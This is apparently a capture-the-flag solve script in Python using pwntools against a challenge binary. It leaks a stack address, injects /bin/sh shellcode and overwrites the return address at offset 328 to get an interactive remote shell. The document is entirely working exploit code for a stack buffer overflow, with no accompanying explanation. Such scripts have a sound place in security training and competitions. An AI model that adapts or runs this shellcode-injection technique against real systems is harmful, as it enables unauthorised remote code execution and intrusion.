#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["kitty", "@launch", "--cwd=current", "--location=vsplit"]
exe = context.binary = ELF(args.EXE or '../dist/chall')

host = args.HOST or '0.0.0.0'
port = int(args.PORT or 9999)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak vuln
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.send(cyclic(0x40))
io.recvuntil(cyclic(0x40))

buf = u64(io.recv(6) + b"\0\0") - 336
log.info(f"buffer @ 0x{buf:x}")

shellcode = asm(shellcraft.sh())
offset = 328

io.sendline(flat({0: shellcode, offset: buf}))

io.interactive()

